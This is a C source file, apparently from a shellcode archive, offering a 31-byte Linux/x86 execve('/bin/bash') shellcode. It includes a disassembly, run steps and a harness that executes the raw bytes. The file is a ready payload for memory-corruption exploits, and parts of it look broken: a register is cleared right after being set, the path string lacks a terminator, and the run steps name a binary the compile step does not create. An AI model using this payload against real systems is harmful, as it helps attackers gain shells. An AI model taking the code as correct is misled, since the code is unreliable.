/*
---------------------------------------------------------------------------------------------------

Linux/x86 - execve(/bin/bash) - 31 bytes

Ajith Kp [ @ajithkp560 ] [ http://www.terminalcoders.blogspot.com ]

Om Asato Maa Sad-Gamaya |
Tamaso Maa Jyotir-Gamaya |
Mrtyor-Maa Amrtam Gamaya |
Om Shaantih Shaantih Shaantih |

---------------------------------------------------------------------------------------------------
Disassembly of section .text:

 08048060 <.text>:
 8048060:	b0 46                	mov    $0x46,%al
 8048062:	31 c0                	xor    %eax,%eax
 8048064:	cd 80                	int    $0x80
 8048066:	eb 07                	jmp    0x804806f
 8048068:	5b                   	pop    %ebx
 8048069:	31 c0                	xor    %eax,%eax
 804806b:	b0 0b                	mov    $0xb,%al
 804806d:	cd 80                	int    $0x80
 804806f:	31 c9                	xor    %ecx,%ecx
 8048071:	e8 f2 ff ff ff       	call   0x8048068
 8048076:	2f                   	das
 8048077:	62 69 6e             	bound  %ebp,0x6e(%ecx)
 804807a:	2f                   	das
 804807b:	62 61 73             	bound  %esp,0x73(%ecx)
 804807e:	68                   	.byte 0x68
---------------------------------------------------------------------------------------------------

How To Run

$ gcc -o bash_shell bash_shell.c
$ execstack -s local_bash
$ ./ local_bash

---------------------------------------------------------------------------------------------------
*/
#include <stdio.h>
char sh[]="\xb0\x46\x31\xc0\xcd\x80\xeb\x07\x5b\x31\xc0\xb0\x0b\xcd\x80\x31\xc9\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68";
void main(int argc, char **argv)
{
	int (*func)();
	func = (int (*)()) sh;
	(int)(*func)();
}